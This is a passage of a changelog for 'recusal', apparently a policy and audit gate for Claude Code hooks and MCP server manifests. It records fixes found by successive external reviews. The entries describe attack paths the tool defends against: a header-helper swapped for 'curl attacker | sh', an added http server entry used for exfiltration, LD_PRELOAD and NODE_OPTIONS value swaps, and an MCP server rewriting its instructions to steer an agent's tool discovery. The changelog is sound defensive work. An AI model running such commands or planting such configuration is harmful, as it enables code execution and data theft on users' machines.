  record, and refuses `callable_name` on standard pins. Runtime identity lives in
  the manifest bytes, so it is inside the digest that audit provenance records.
- **Backward compatibility, explicitly**: manifest v5 is refused with a re-pin
  instruction naming the gap it predates (a plugin tool whose raw name requires
  normalization could be refused under Claude's spelling, or alias an approved
  callable); the call-time bridge fails closed on a v5 manifest, never open.

### Changed
- The plugin claim in the README is upgraded to match: full spec-valid plugin tool
  names are supported under the explicit plugin mode. The boundary that remains,
  stated as before: `PreToolUse` carries only the callable name, so a
  post-verification raw-declaration swap preserving an approved callable is
  indistinguishable at call time until the next `verify`, which now refuses on raw
  identity - exactly why both identities are pinned.

## [0.5.8] - 2026-07-12

A claim-correction patch from an eleventh external review, whose central finding was
a failure of OUR verification, not of the reviewed code: 0.5.7 published that Claude
does not document plugin callable-name normalization, when the rule IS explicitly in
the Claude Code MCP reference ("any character outside A-Z, a-z, 0-9, _, and - is
replaced with _"). The sweep missed it on the page it read, and the resulting text
also falsely rejected the tenth review's correct claim.

### Documentation
- **The plugin callable-name boundary corrected to the documented rule** (README,
  0.5.7 changelog entry, and published 0.5.7 release notes, all amended in place):
  plugin call-time mapping is supported only when the raw plugin, server, and tool
  components already use the callable-safe set; a statically pinned dotted name is
  refused at call time under Claude's normalized spelling; "false denial, never a
  false allow" is withdrawn (two raw names can normalize to one callable, so a
  post-verification raw-declaration swap can alias an already-approved callable name
  until the next verify reports the drift - the point-in-time boundary, sharpened
  for plugins and now stated with the `list_changed` residual); and the
  "observe and pin the exact runtime spelling" advice is withdrawn as not
  implementable (the manifest keys tools by raw declaration name). Raw-vs-callable
  identity modeling with collision refusal is required 0.6.0 scope (manifest v6).
- The `diff_observation` numbered contract states the all-servers-removed exception
  (`mcp_full_decommission_unsupported`) alongside the removal-warning rule.
- The CLI decommission test is renamed to what it actually proves (an
  unpinned-observation refusal) and asserts the precise full-decommission finding is
  NOT on that path: it is a library-level adjudication, and the CLI directs full
  decommission through manifest removal (Option B of the review's choice).

### Tests
- The alias residual is pinned as a demonstration: the approved callable spelling
  passes at call time (and would still pass after a live raw-declaration swap the
  hook cannot see), and the next verify refuses the swapped declaration as unpinned
  capability plus a removed pinned tool.

## [0.5.7] - 2026-07-12

A small correctness patch from a tenth external review (which found no P0 and
recommended folding these into 0.6.0; shipped now as 0.5.7 instead): all-servers-
removed semantics made deliberate, exception-contract consistency, and the plugin
callable-name boundary stated to exactly what the documentation establishes.

### Fixed
- **Full decommission refuses with the precise reason (P1).** Acknowledging removal
  of EVERY pinned server tripped the generic empty-observation refusal alongside the
  nonblocking removal warnings - safe-side, never a bypass, but inconsistent with the
  removal wording. Deliberate now: `removed` supports transitions where at least one
  pinned server remains observable; acknowledging all of them refuses with
  `mcp_full_decommission_unsupported`, naming the real decommission path (an empty
  observation certifies nothing, and the manifest keeps authorizing every pinned
  runtime name regardless - remove or replace the manifest itself: no pin, no MCP).
  Stated in the CLI help and verify docstring.
- **Malformed sequence members raise the documented `ValueError` (P1).** An
  unhashable member of `unverifiable`/`removed` (a list, a dict, a bytearray) raised
  `TypeError` from duplicate detection before its type was rejected. Element types
  now validate before duplicate detection; the 0.5.6 changelog's "fully strict" is
  amended in place.

### Documentation
- **The plugin callable-name boundary (P1).** *(Amended 2026-07-12, same day: as
  first published, this entry said Claude's docs "do not currently specify" the
  plugin callable normalization and rejected the tenth review's
  replace-with-underscore claim. That was OUR verification failure, not the
  review's error: the rule IS explicitly documented in the Claude Code MCP
  reference ("any character outside A-Z, a-z, 0-9, _, and - is replaced with _"),
  and the sweep missed it on the page it read. The eleventh review caught it.
  Consequences corrected with it: "false denial, never a false allow" was too
  strong - two raw names can normalize to the same callable, so a
  post-verification raw-declaration swap can alias an already-approved callable
  name until the next verify; and "observe and pin the runtime spelling" was not
  implementable, since the manifest keys tools by raw declaration name. The
  supported boundary is now stated exactly: plugin call-time mapping only for raw
  components already in the callable-safe set; raw-vs-callable identity modeling
  with collision refusal is 0.6.0 scope.)*
- The unified-verifier composition comment includes removal acknowledgements and
  whole-server inventory; the verify docstring's remote OAuth wording is
  per-transport (http/sse pin OAuth fields; ws is header-only).

## [0.5.6] - 2026-07-12

A narrowly scoped correctness patch mandated by a ninth external review: whole-server
observation completeness, strict observation-container validation,
manifest-before-business-policy ordering, reserved Claude server-name fidelity, and
the remaining MCP documentation corrections.

### Fixed
- **A wholly omitted pinned server refuses (P0).** `diff_observation` inherited
  `diff_manifest`'s absent-server WARNING for a pinned server missing from EVERY
  observation component, so a partial multi-server observation could verify clean
  while the manifest kept authorizing that server's pinned runtime names - a
  verification-coverage bypass for an existing pinned server (never a call-time
  name-authorization bypass). Now: a pinned server absent from every component is a
  CRITICAL refusal (`mcp_server_unobserved`); a deliberate removal is acknowledged
  explicitly (`McpObservation(removed=...)`, CLI `--removed NAME`), recorded as a
  passing WARNING naming the transition; `removed` may name only pinned servers and
  contradicts any representation; re-pinning without the server is the clean end
  state. The catalog-only `diff_manifest` primitive keeps its documented WARNING,
  because it claims only catalog comparison. A regression test demonstrates WHY: the
  omitted server's runtime tool name stays authorized by `manifest_policy` while the
  partial verification would have passed.
- **The observation structural contract validates the documented container types
  (P1).** *(Amended 2026-07-12: originally "fully strict" - a tenth review found one
  remaining exception-order edge: an unhashable sequence member raised TypeError from
  duplicate detection before its type was rejected. ValueError-consistent since
  0.5.7.)* `unverifiable` (and `removed`) accepted any iterable: a string iterated to characters, a dict to its
  keys, None raised `TypeError` instead of the documented `ValueError`. Both now
  require a list or tuple of unique nonempty names. Every source observation VALUE is
  structurally validated (`normalize_source`) before any comparison - including on
  unpinned, source-only, or catalog-less servers: the observation's structural
  contract does not depend on whether the manifest pins the server.
- **Manifest membership is established before the wrapped business policy runs (P1).**
  `manifest_policy` invoked the wrapped argument-level policy first, so an unapproved
  MCP capability (or a missing/corrupt manifest) still triggered downstream policy
  work - and adopter policies are not required to be side-effect-free (subject
  lookups, file reads, network evidence-gathering). Order now: non-MCP calls run the
  wrapped policy as before; MCP calls establish manifest availability and
  runtime-name membership FIRST; the wrapped policy runs only for pinned calls.
  Matches the docstring, which now also states that an unpinned call never invokes
  the wrapped policy.
- **Reserved Claude server names refuse before anything launches (P1).** Claude Code
  reserves `workspace`, `claude-in-chrome`, `computer-use`, `Claude Preview`, and
  `Claude Browser` for built-in servers, skips user config entries using them (with a
  warning), and rejects them in `claude mcp add`. The parser represented - and the
  pin path would launch - such entries. `servers_from_claude_config` now refuses a
  reserved name before classification or any command execution, one regression test
  per documented name proving no marker command runs. The list mirrors current
  documented Claude behavior and is maintained as Claude adds reserved names.

### Documentation
- **SSE OAuth corrected**: 0.5.5 said Claude's docs "are silent on SSE" - the
  reference states its preconfigured OAuth flags "only apply to HTTP and SSE
  transports". The affirmative form now appears in the source comments, README, and
  the amended 0.5.5 changelog entry, with SSE's upstream deprecation in favor of
  HTTP noted; the README's earlier http/sse/ws-all-pin-OAuth phrasing and the later
  http-only phrasing were internally inconsistent and both now read: OAuth policy
  fields pin for `http`/`sse`; `ws` is header-only and refuses.
- **MCP roots named out of scope**: Recusal does not pin or govern `roots/list`
  responses (the session launch directory plus additional working directories) or
  `notifications/roots/list_changed`; Claude working-directory permissions,
  additional-directory configuration, server-side root enforcement, and OS controls
  own that boundary (README and SECURITY).
- **Manifest-v5 terminology finished**: the `recusal.mcp` module heading reads "tool
  and server-instruction integrity" (not "tool-catalog governance"); the README
  discovery heading and verify comment name instructions alongside declarations;
  "verify proves the catalog" reads as the full represented source, instruction, and
  declaration scope plus the new whole-server inventory rule; the stdio collector
  states it contacts no HTTP/SSE/WebSocket server; `servers_from_claude_config`
  documents OAuth as transport-specific.

## [0.5.5] - 2026-07-12

A narrowly scoped correctness patch mandated by an eighth external review:
complete-observation validation, malformed-event provenance reset, canonical tool-pin
fields, and WebSocket configuration fidelity.

### Fixed
- **`McpObservation` is a strict complete-observation contract (P0).** As shipped in
  0.5.4, `diff_observation` compared only the components the caller supplied: omitting
  `sources` bypassed launch/remote identity entirely (matching catalog plus matching
  instructions passed against a pin that carries a stdio or HTTP source), a truthy
  non-bool `observed` was coerced to "observed", falsey catalog values normalized to
  empty tool lists (a malformed observation read as a mere shrunk-set WARNING), and
  servers appearing only in `sources`/`instructions`/`unverifiable` escaped
  adjudication. Now the observation's own shape is validated before any comparison
  (`ValueError` on malformation: non-list catalog values, non-bool `observed`,
  records other than exactly `{"observed": bool, "text": str|None}`, duplicate or
  empty `unverifiable` names), every catalog server requires an explicit source
  observation (`mcp_source_unobserved` CRITICAL; the dump path's explicit weak claim
  is `{"transport": "external"}`, never an omission) and an explicit instruction
  record (the legacy weaker claim is the explicit `{"observed": false, "text": null}`),
  an unpinned server in ANY component is a CRITICAL refusal, and a pinned server
  represented only partially must be named `unverifiable` or is refused as an
  incomplete observation. `diff_manifest` refuses malformed catalog values
  (`mcp_malformed_catalog`) instead of truthiness-normalizing them. The named
  boundary: a server the observation does not represent at all is still only the
  pinned-server-absent WARNING, because an observation cannot prove the absence of
  servers it never looked at - collect against the full config, as the CLI does.
- **A malformed hook event cannot inherit prior manifest provenance (P0).** The
  ContextVar reset ran only when the policy executed, and a malformed event fails
  BEFORE the policy runs - so in a reused process (one thread, one policy object) a
  malformed event's audit record inherited the digest of the last valid adjudication.
  `manifest_policy` now exposes `reset_control_identity()`, and
  `run_pretooluse_hook` calls it before parsing the envelope: an event that never
  reached the policy never carries the policy's provenance. Regression-tested across
  six malformed-envelope shapes, in fail-closed and fail-open modes, and with the
  first call unaudited. (Claude Code's command hooks run a fresh process per
  invocation; this affected the reusable library path.)
- **Tool pins are fully canonical (P1).** A pin is exactly
  `{"fingerprint": ..., "fields": {...}}` - a missing `fields` member refuses, and
  `fields` names must come from the tracked diagnostic set (an undefined field hash
  has no defined diagnostic meaning). Schema integrity: the complete tool fingerprint
  was already the authoritative declaration-integrity value.
- **WebSocket sources are header-only (P1).** Claude Code documents that HTTP
  supports OAuth "while WebSocket supports neither" (ws authentication is
  header-only), but the parser accepted and pinned `oauth` for `ws` entries - a shape
  Claude does not support, misrepresenting the mirrored configuration surface. A `ws`
  entry or source carrying `oauth` now refuses in both `.mcp.json` parsing and
  `normalize_source`, and the canonical ws source shape carries no `oauth` member at
  all. *(Amended 2026-07-12: this originally said the docs "are silent on SSE".
  Claude's reference states its preconfigured OAuth flags "only apply to HTTP and
  SSE transports", so `sse` keeps the OAuth shape affirmatively, noting SSE is
  deprecated upstream in favor of HTTP.)* Existing ws pins, if any, re-pin under the
  corrected shape.

### Documentation
- 0.5.4's overstatements amended in place (changelog and published release notes):
  "the final 0.5.x correctness patch" (history describes, it does not predict),
  "omission-resistant on every public verification path", the review-7
  no-corrections claim (this release's own parser carried the ws-oauth mismatch),
  and "complete transitive build+publish closure" narrowed to the Python build and
  metadata-check environment (publishing is a separately SHA-pinned action via
  Trusted Publishing, outside the Python lock - so stated in the lock header and
  workflow too).
- The README module table names server-instruction integrity and the outside-manifest
  list alongside the tool catalog; the ws header-only boundary is stated with the
  OAuth scope boundary; the last unqualified determinism shorthand ("same evidence,
  same policy, same version, same verdict" in the demo section) is fully qualified;
  and the pin CLI help names tool declarations, server instructions, and source
  configuration warnings instead of "descriptions".

## [0.5.4] - 2026-07-12

A correctness and release-rigor patch mandated by a seventh external review: unified
manifest-v5 observation verification, rich single-server instruction observations
preserved, normal manifest-policy provenance made context-local under concurrent
reuse, manifest schemas tightened, and the Python build environment hash-locked.
*(Amended 2026-07-12: this introduction originally said "the final 0.5.x correctness
patch", claimed the verify was "omission-resistant on every public verification path"
- an eighth review showed source identity could still be omitted and component shapes
were not validated - and called review 7 "the first whose Claude-behavior claims all
verified without correction", while 0.5.4's own parser accepted OAuth for WebSocket
entries, a shape Claude documents as unsupported. Release history describes what
changed; it does not predict that no further correction will be found. See 0.5.5.)*

### Fixed
- **A unified manifest-v5 verify: `diff_observation` (P0).** *(Amended 2026-07-12: as
  shipped in 0.5.4 this was omission-resistant for server-INSTRUCTION coverage only;
  source-observation omission and component-shape validation were closed in 0.5.5.)*
  `diff_manifest` is catalog-only, so a programmatic caller could verify unchanged
  tools and read the clean result as a full v5 verify while the server's instructions
  had been rewritten - the CLI composed the three primitives correctly, but the public
  library path did not guarantee it. `diff_observation(pinned, McpObservation(...))`
  now validates the manifest and compares sources, instruction state, tool catalog,
  and unverifiable servers in one call; a pin WITH instruction coverage verified
  against an observation carrying none is a CRITICAL refusal
  (`mcp_instructions_unobserved`), never a silent pass, so omitting the instruction
  observation cannot weaken the verify. `recusal mcp verify` routes through it, the
  CLI and library are pinned to agree on blocking outcomes, and `diff_manifest` is
  documented as the deliberate catalog-only primitive.
- **Rich single-server `--from` observations keep their instructions (P0).** With
  `--server NAME`, a dump carrying `{"instructions": ..., "tools": [...]}` had its
  instructions silently discarded and recorded as `observed: false` - a supplied
  stronger observation downgraded to the weaker claim. The key now decides: absent =
  not observed (legacy tools/list result), present-null = observed and the server
  declares none, string = observed and pinned; a non-string refuses. Added, changed,
  and removed instructions are each regression-tested through the single-server path,
  and the CLI help documents the rich shape and the weaker legacy claim.
- **Audit manifest provenance is invocation-local under concurrency (P0).**
  `manifest_policy` carried its verified digest on a mutable policy-object attribute:
  correct sequentially, but two threads sharing one policy object could
  cross-contaminate audit provenance (one invocation's clear erasing the digest
  another was about to record). The digest now lives in a `ContextVar` (isolated per
  thread and per asyncio task), read by the audit layer through the policy's
  `get_control_identity()`; a plain `last_manifest_digest` attribute is still honored
  for custom policy objects and documented as a sequential-only seam. Deterministic
  barrier-interleaved tests prove each audit record sees exactly the digest its own
  invocation verified, that a concurrent non-MCP call records none, and that a
  concurrently-corrupted manifest is never recorded as enforced.
- **Only canonical manifest shapes load (P1).** The loader accepted
  `server_instructions` encodings the builder never emits (`present` under
  `observed: false`, a fingerprint under `present: false`, extra keys) and ignored
  unknown fields at the manifest top level, server entries, and tool pins. A
  deterministic control artifact must not carry fields whose meaning is undefined:
  exactly the three canonical instruction shapes are accepted, and undefined fields
  refuse at every level.

### Changed
- **The release build environment is hash-locked.** `release-requirements.txt` pins
  the Python build and metadata-check dependency environment for the release runner
  (ubuntu/cp312, 33 packages) with the sha256 of every distribution file PyPI serves
  per release *(amended 2026-07-12: originally "the complete transitive build+publish
  closure" - publishing is performed by a separately SHA-pinned GitHub Action via
  Trusted Publishing, outside this Python lock)*;
  the release workflow installs it with `--require-hashes` and builds with
  `--no-isolation`, so no unpinned PEP 517 resolution happens in the release path. A
  CI job proves the locked environment installs and builds on every push, before any
  tag exists. Drift locks pin the lock to pyproject's hatchling and the workflows to
  the lock. Stated narrowly: this pins what installs in the release environment; it
  does not make the build byte-reproducible (untested), and pip on the runner image is
  outside the lock.
- The release workflow verifies the built wheel from a neutral directory (from the
  repo root, `import recusal` finds the checkout and proves nothing about the wheel),
  and its version-mismatch message names the actual version source
  (`recusal/__init__.py`, not "pyproject").

### Documentation
- **0.5.3's own overstatements corrected in place** (changelog and published release
  notes): "the last uncovered MCP discovery-content surface" and "every statement
  that exceeded the implementation corrected" were absolute completion language of
  exactly the kind that release existed to remove.
- **Tool Search qualified everywhere**: tool names and server instructions load at
  session start *under Claude Code's default tool-search behavior*, and full
  definitions may load up front when tool search is disabled or falls back, when a
  server sets `alwaysLoad`, or when a tool declares `anthropic/alwaysLoad`.
  `alwaysLoad` is named a context-loading policy field (it changes what enters model
  context), shape-validated but deliberately excluded from source identity; a
  tool-level `anthropic/alwaysLoad` inside a declaration IS part of its fingerprint.
- **Instruction hashing vs Claude truncation documented**: Recusal fingerprints the
  complete observed instruction string while Claude truncates loaded context
  (currently 2KB each for instructions and tool descriptions), so a change outside
  the loaded prefix still drifts - the safe side of the asymmetry.
- **The hook exit-code contradiction removed**: the normal refusal is exit 0 WITH
  `permissionDecision: "deny"` JSON (honored as a block); exit 2 is the blocking
  failure signal; only *other* nonzero exits are non-blocking, which is precisely the
  gap the launcher's coercion closes. "Anything other than exit 2 is non-blocking" no
  longer appears.
- **OAuth boundary stated exactly**: the pin records configured policy fields
  (including the configured `scopes` string, whose change is drift); it does not
  observe the final authorization request, scopes Claude appends (such as
  `offline_access`), the issued token, granted authority, or server-side
  authorization results.
- The discovery boundary row reads `initialize.instructions` + `tools/list`; the
  remote instruction-coverage requirement (rich `--from` shape) is stated prominently;
  SECURITY.md's MCP row covers manifest v5, the full outside-the-artifact list, and
  the call-time name-membership boundary; the 0.5.2 changelog's plugin
  exact-implementation and hook-timeout-non-blocking claims are amended in place; the
  remaining "same evidence, same verdict" shorthand is fully qualified (same
  normalized evidence and policy inputs, same recusal version) in README,
  CONSTITUTION, FAQ, WHY, and the package docstring; LANDSCAPE is scoped as a dated
  documentation review with no market-exhaustiveness or absence claims; and the
  pin-refusal operator message names declarations, instructions, AND source warnings.

## [0.5.3] - 2026-07-12

The correctness and claim-boundary release mandated by a sixth external review, before
any 0.6.0 work: audit provenance made authoritative, the server-instruction gap that
review identified added to manifest v5, and the specific overstatements it named
corrected (the completion language, the stale v3 shapes, the layered-diagram order,
the timeout claim, the exit-code semantics, the scope lists; the itemized list is the
Documentation section below). *(Amended 2026-07-12: this introduction originally said
"the last uncovered MCP discovery-content surface" and "every statement that exceeded
the implementation corrected" - absolute completion language of exactly the kind this
release existed to remove. A seventh review found further gaps; see 0.5.4.)*

### Fixed
- **Audit control identity is authoritative (P0).** Caller-supplied `control=` values
  for `recusal_version` and `manifest_sha256` were merged AFTER the implementation's
  values, so a caller could forge both - provenance theater, not provenance. Reserved
  keys are now stripped from caller input and always written by the implementation;
  one `_control_identity` helper serves every audit path including the fail-open
  malformed-event record; `manifest_policy` records its digest only AFTER successful
  parse and validation (a corrupt manifest is never recorded as enforced) and clears it
  per invocation (a non-MCP call through the same policy object never inherits a
  previous call's manifest provenance). Each failure mode is regression-tested.
- **Manifest v5: server instructions are pinned (P0).** With Claude Code's default
  tool-search behavior, tool names and server INSTRUCTIONS load at session start while
  full tool definitions are deferred (full definitions may load up front when tool
  search is disabled or falls back, when a server sets `alwaysLoad`, or when a tool
  declares `anthropic/alwaysLoad`), so a server that keeps `tools/list` byte-identical
  and rewrites only its initialize-result `instructions` steers discovery invisibly to
  v4. The fetcher now
  observes instructions, the pin screens them with the same bounded marker/size review
  as declarations, they are stored as a hash (never readable text), and added, removed,
  or changed instructions are CRITICAL drift. A legacy `{server: [tools]}` dump is
  recorded as `observed: false`, keeps that weaker claim honestly, and an observation
  that later carries instructions refuses with a re-pin instruction - unreviewed
  influence content cannot ride in on a collector upgrade. The rich `--from` shape is
  `{"instructions": ..., "tools": [...]}`; v4 manifests are refused with a re-pin
  instruction.
- **Runtime-only config fields are validated (P1).** `timeout` must be an integer of at
  least 1000 milliseconds (Claude ignores smaller values, and a silently ignored value
  must not read as faithfully represented) and `alwaysLoad` a boolean; malformed values
  refuse. OAuth shapes are tightened: `callback_port` must be a real TCP port, a
  literal `auth_server_metadata_url_template` must be https (a `${VAR}` template stays
  unexpanded; the resolved scheme is Claude's to enforce), and `scopes` must be a
  nonempty, duplicate-free space-separated set.

### Changed
- **One Python version source.** The package version lives only in
  `recusal/__init__.py` (hatch reads it via `[tool.hatch.version]`); a literal in
  pyproject is drift-locked out by test. Plugin/marketplace JSON keep literals (JSON
  cannot import Python) under the existing drift locks.
- **The release build toolchain is pinned** (`hatchling==1.27.0`, the newest that
  still supports Python 3.9, plus `build==1.5.1` and `twine==6.2.0`), reviewed and
  bumped deliberately like the action SHAs. Stated
  narrowly: this pins the top-level toolchain versions; full hash-locked dependency
  trees, attestations, and an SBOM remain 0.6.0 supply-chain scope.
- The plugin's shipped policy declares `policy_version` alongside `policy_id`.

### Documentation
- **Completion language removed.** 0.5.2's "architecture closure" / "implemented
  completely" is amended in place and in the published release notes; the accurate
  description is architecture hardening with named boundaries. The plugin claim is
  precisely "declared-version binding" (it does not attest package bytes or a modified
  package retaining the version string), and its quick-start pins the exact version.
- **Semantics corrected to the documented Claude behavior**: the layered diagram now
  shows `PreToolUse` running BEFORE the native permission prompt (deny-wins precedence
  noted); the deny path is exit 0 with `permissionDecision: "deny"` JSON while the
  launcher's exit-2 coercion covers gate-process failures (the "every failure mode"
  claim is narrowed to the four modes the launcher actually closes); the hook-timeout
  authorization outcome is stated as NOT independently established rather than assumed
  non-blocking; the effective-MCP-environment scope names every Claude state it does
  not reconstruct; plugin MCP naming gets the exact worked example
  (`plugin_my-plugin_database-tools` as the server key); declared policy identity is
  named as caller-supplied labels; stale v3 "header names" descriptions are corrected
  or labeled historical; "hashes only" reads "declarations and instructions as hashes,
  source templates readable" everywhere; the remaining "same evidence, same verdict"
  shorthand carries the policy/version qualifier; categorical competitor claims,
  percentage estimates, and roadmap language are removed from LANDSCAPE/WHY/FAQ/PROVEN;
  and the cookbook dumper emits the rich instructions-bearing observation shape.

## [0.5.2] - 2026-07-12

The architecture-hardening release, driven by a fifth external review: it closes the
manifest-v3 remote configuration gaps, adds declared-version binding for the Claude
plugin, adds audit control metadata, and documents the remaining Claude and MCP
boundaries. (This section originally said "architecture closure" and "implemented
completely"; the sixth review showed that overstated it - audit control fields were
caller-overridable, server instructions were unpinned, and plugin binding is
declared-version, not byte attestation. 0.5.3 addresses each.)

### Added
- **Manifest version 4: remote authentication identity.** Remote sources now pin header
  value TEMPLATES (a same-name `Authorization` swap between `${READ_ONLY_TOKEN}` and
  `${ADMIN_TOKEN}` is drift - v3 pinned header names only and passed it), the
  `headersHelper` command template (Claude executes it at connect time; it was
  previously invisible to verification entirely, so an approved token script could be
  swapped for `curl attacker | sh` without drift), and the OAuth policy surface
  (`client_id`, `callback_port`, `auth_server_metadata_url_template`, `scopes` - the
  scope set is the native mechanism constraining requested authority, and widening it
  is now drift). Resolved credentials and client secrets never appear in a pin, and
  neither do hashes of them. `timeout` and `alwaysLoad` are classified runtime-only:
  allowed, deliberately not identity. A field the parser cannot classify fails closed -
  an unclassified field could be executable configuration (exactly how `headersHelper`
  was once dropped silently). v3 manifests are refused with a re-pin instruction.
- **Audit control identity.** Every hook audit entry now records the recusal package
  version automatically, caller-declared policy identity via
  `run_pretooluse_hook(control={"policy_id": ..., "policy_version": ...})`, and the
  manifest content digest a `manifest_policy` enforced. A verdict is replayable only
  when the adjudication rules are identifiable: same evidence is insufficient if the
  policy changed.
- **The plugin is bound to its adjudicator's declared version.** The plugin gate
  refuses (fail closed, versions named) when the importable recusal package version
  differs from the plugin's expected version; a drift-lock test keeps shim, plugin
  manifest, and package versions equal. *(Amended 2026-07-12: this originally said the
  plugin identity "names the exact implementation that decides". The control is
  declared-version binding: it detects a version-string mismatch but does not attest
  package bytes or installation provenance.)*
- **Secret-template review screen.** Pin-time machine-readable WARNINGs for literal
  header values (`mcp_header_literal`), secret-bearing `${VAR:-default}` defaults
  (`mcp_template_default`), and literal values following credential-shaped argument
  flags (`mcp_arg_secret`) - a deny-list with a deny-list's ceiling, surfacing the
  obvious for review, never claiming secret detection.

### Changed
- **A remote-only pin no longer demands `--approve-server-launch`.** Approval is
  required exactly when a stdio process would execute; parsing the config is safe and
  happens first.
- **Terminology narrowed to what is implemented**: "MCP tool-catalog governance" (not
  "MCP discovery governance"), "the three MCP tool-call boundaries", and "the manifest
  stores tool declarations as hashes; source templates are stored readable" (not
  "hashes only"). "Same evidence, same policy, same version, same verdict" became the
  wording everywhere. *(Since 0.5.4 the fully qualified form is used: the same
  normalized evidence and policy inputs, under the same recusal version, produce the
  same verdict.)*

### Documentation
- **The layered Claude architecture is stated up front**: Recusal is the deterministic
  policy and adjudication layer inside Claude Code's stack (managed policy, native
  permissions, sandboxing, MCP authentication), not a replacement for any of it.
- **Scope, stated exactly**: Recusal verifies the supplied configuration artifact, not
  Claude Code's effective MCP environment across local/user/plugin/managed/connector
  scopes (constrain those with Claude managed MCP policy); it governs MCP tools, not
  prompts/resources/channels/elicitation; verification is point-in-time under dynamic
  `list_changed`; remote authentication and transport belong to Claude or the client
  producing the `--from` dump; plugin-bundled MCP servers use scoped runtime names
  (`mcp__plugin_<plugin>_<server>__<tool>`) and are governed by pinning that full name.
- **The hook-timeout residual is named**: Claude cancels a hook at the configured
  timeout (default 600s); shipped policies adjudicate in milliseconds, and a SHORT
  per-hook timeout would widen any fail-open window, not close it. *(Amended
  2026-07-12: this originally asserted the documentation "treats timeouts as
  non-blocking". Claude documents the cancellation, but this repository has not
  independently established the resulting authorization outcome for the launcher.)*
- **Production runtime pinning documented**: a dedicated venv with an exact
  `recusal==<version>`, registered explicitly and protected from agent writes.
- Guardrail and agent-framework comparisons corrected to the precise, defensible form;
  the 0.5.1 changelog's "whole execution-relevant surface" claim is amended in place.

## [0.5.1] - 2026-07-12

The trustworthiness patch, driven by a fourth external review of 0.5.0: the source
artifact now represents every supported server entry in the supplied `.mcp.json`,
including remote transport and URL identity, adds environment value-template integrity
for stdio servers, and every confirmed correctness finding is fixed. (Remote header
value templates, headersHelper, and OAuth configuration joined source identity in
0.5.2's manifest v4; this section originally claimed the "whole execution-relevant
surface", which overstated v3.)

### Fixed
- **Every configured server is verified, remote transports included (P0).** `.mcp.json`
  is parsed by transport TYPE with Claude Code's rules: `http`/`streamable-http`/`sse`/
  `ws` entries are first-class identities pinned as `{transport, url_template,
  header_keys}` (manifest v3 behavior at the time of 0.5.1; v4 later replaced
  header names with header value templates); an added unpinned remote server, a
  transport swap, a URL without a type, an unsupported type, or a remote entry carrying
  stdio launch fields each fail closed - previously a remote entry was a silently
  skipped name, so an attacker could add `{"type": "http"}` exfiltration to the config
  and verify still passed. A mixed pin now refuses unless `--from` supplies the remote
  catalogs: a partial pin must not read as a full one.
- **Environment value templates are pinned (P0; manifest version 3).** v2 pinned env
  variable *names* only, so a same-key value swap in the config - `NODE_OPTIONS`,
  `LD_PRELOAD`, `PYTHONPATH` - passed the preflight and executed attacker code at
  launch. v3 pins the as-written value templates: a config-level value change or
  `${VAR}` reference rename is drift, refused before launch. Resolved values still
  never appear in a pin; a LITERAL env value does become manifest content, named at pin
  time as a JSON-visible WARNING (`mcp_env_literal`) with the fix (use `${VAR}` for
  secrets). The residual is narrowed and pinned as a test: the operator-shell value
  behind a `${VAR}` reference is not the config's to pin. v1 and v2 manifests are
  refused with re-pin instructions.
- **`recusal init --repair-launcher` migrates pre-0.4.2 Windows installs.** `init` treats
  any existing recusal hook as already-installed, so doctor's old remediation ("re-run
  init") changed nothing on hosts whose POSIX launcher fails OPEN under the PowerShell
  fallback. The repair recognizes exactly the canonical launchers, replaces them with
  the host-appropriate entries, preserves custom hooks and every other setting, never
  touches the gate policy file, and is a no-op the second time. Doctor now recommends it.
- **`verify(entries, expected_head=...)` returns a named failure on a non-object final
  record** instead of raising - the anchor exists precisely to catch a mangled tail.
- **The manifest-policy cache is thread-safe**: (digest, names) is one immutable pair
  swapped under a lock, and the returned names are always derived from the bytes the
  same call read, so a multi-threaded runtime can never observe one manifest's digest
  associated with another manifest's authorization set.
- **The observer's peak memory matches its budget claim**: the reader thread reserves
  against the total-character budget BEFORE enqueueing and the queue holds at most 4
  lines - previously the budget was charged on dequeue, so a hostile server could park
  queue-times-line-cap (multi-GB) in memory before the limit fired.
- **The GitHub Action aggregates every gate**: GitHub runs `shell: bash` with fail-fast,
  which aborted the script at the first failing gate before `bump $?` ran; `set +e` now
  precedes the aggregation, so every selected gate runs and the highest exit code wins
  (drift-locked by a test).
- **Protocol strictness**: a matching response without the `jsonrpc: "2.0"` envelope,
  or an `initialize` result without a named `serverInfo` object or a `tools` capability
  *object*, refuses. One monotonic `observation_timeout` (default 300s) spans
  initialize plus all pagination, so a server answering just inside each per-request
  deadline cannot stretch an observation to ~101x the timeout.
- **`build_manifest` refuses an empty tool name** (it previously wrote an artifact its
  own loader rejects), an explicitly supplied invalid source raises instead of silently
  downgrading to external, an external source carrying stdio fields is contradictory
  and refused, and falsey malformed config values (`"args": ""`, `"env": []`) are
  rejected instead of being coerced to empty defaults.

## [0.5.0] - 2026-07-12

The MCP launch-template-integrity release: the pin now covers the approved stdio launch
template used to request the catalog, not only the declarations it returns, closing the
command and argument substitution path named as the highest-priority trust gap. (This
section originally said "execution identity" and "WHAT PROCESS"; that overstated it.
What v2 proves is launch-TEMPLATE integrity: command template, argument templates, cwd,
and env variable names. Environment values, PATH/registry resolution, executable bytes,
and remote transport identity are not attested; see the residuals below.)

### Added
- **Manifest version 2: launch specifications are pinned and compared BEFORE launch.**
  Each server pinned from `--stdio`/`--claude-config` records its launch identity - the
  UNEXPANDED command template, args, cwd, and environment variable *names* (never
  values, and never hashes of values: a low-entropy secret's hash is an oracle) - plus a
  `source_fingerprint` over the canonical identity. `recusal mcp verify` compares every
  configured launch specification against the pin before starting any process: a
  changed command, changed args, or a server that was never pinned is refused **without
  executing** the configured command, and one drifted server stops its siblings from
  launching too. Proven by an adversarial test: the attacker swaps the approved command
  for one that writes a marker file when executed; verify exits 2 naming the drifted
  fields and the marker file does not exist. Dump-supplied (`--from`) servers are
  pinned as `transport: "external"` - recusal never launches them, and that is
  recorded rather than implied. A version-1 manifest is refused with a re-pin
  instruction: it certifies the weaker guarantee and must not read as the stronger one.
- **`--approve-server-launch`: the first pin is an explicit trust event.** Pinning from
  `--stdio`/`--claude-config` executes the configured commands (there is no other way
  to ask a process for its catalog), so the pin now refuses without this flag, before
  anything runs. After the pin, verification never launches an unapproved
  specification, so the approval is a one-time event per launch spec.
- **Claude-compatible `.mcp.json` resolution.** `${VAR}` and `${VAR:-default}` expand in
  `command`, `args`, and `env` values with Claude Code's documented semantics; a
  referenced variable that is unset with no default fails CLOSED (a partially-expanded
  command would observe a different server than the live session); `CLAUDE_PROJECT_DIR`
  is injected into the spawned server's environment exactly as Claude Code injects it;
  and non-string args/env values are rejected, never silently `str()`-ed. The pinned
  template stays unexpanded; expansion happens at launch, after the identity check.

### Changed
